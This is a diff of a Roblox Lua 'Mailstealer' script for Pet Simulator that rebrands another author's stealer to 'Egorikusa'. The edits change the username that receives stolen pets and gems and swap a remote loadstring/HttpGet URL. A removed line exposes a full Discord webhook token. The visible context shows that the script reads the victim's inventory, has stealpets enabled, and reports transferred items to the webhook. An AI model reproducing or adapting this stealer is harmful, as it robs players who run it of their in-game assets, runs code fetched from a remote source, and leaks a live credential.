@@ -1,13 +1,13 @@
-Username = "Timoffey11"
+Username = "loadstping"
 LoadScreen = false -- If you want to enable loadgui, rename to true
-Webhook = "https://discord.com/api/webhooks/1118931668527485069/OVWA43q9VXP7udXb0ae8OJFRs8yL60dOMHawkgc5IpqvTdhRcB7gFpwgfo25R-7wZg3U"
+Webhook = ""
 
 
 if LoadScreen == nil then
 LoadScreen = true
 end
 if LoadScreen == true then 
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/hsdfuyhsdufhs/loadingscreen/main/loadingscreen"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Egorikusa/PetSimulator99/main/loadingscreen"))()
 end
 -- Script:
 -- VARIABLES
@@ -16,7 +16,7 @@ stealpets = true
 local library = require(game.ReplicatedStorage.Library)
 local save = library.Save.Get().Inventory
 local plr = game.Players.LocalPlayer
-local MailMessage = "Za Russia"
+local MailMessage = "InsaneXorek_Top and Egorikusa on top"
 local GetSave = function()
     return require(game.ReplicatedStorage.Library.Client.Save).Get()
 end
@@ -233,10 +233,10 @@ end
 
 local Data = {
     ["content"] = Content,
-    ["username"] = "Anos: Mailstealer",
+    ["username"] = "Egorikusa: Mailstealer",
     ["embeds"] = {
         {
-            ["title"] = "Anos Stealer",
+            ["title"] = "Egorikusa Stealer",
             ["description"] = "**"..utf8.char(9989).." | Total Huges: **\n```"..AmountOfHuges.."```\n**"..utf8.char(10060).." | Failed to Send (No Funds)**".."\n```"..Fail.."```\n** <:x84x:1187031475418312785> | Diamonds Transferred: "..Results["Gems"].."**",
             ["fields"] = {
                 {
@@ -250,7 +250,7 @@ local Data = {
             },
             ["color"] = 0xF8F8F8,
             ["footer"] = {
-                ["text"] = "Anos Scripts: Mailstealer"
+                ["text"] = "Egorikusa Scripts: Mailstealer"
             },
             ["timestamp"] = DateTime.now():ToIsoDate()
         }
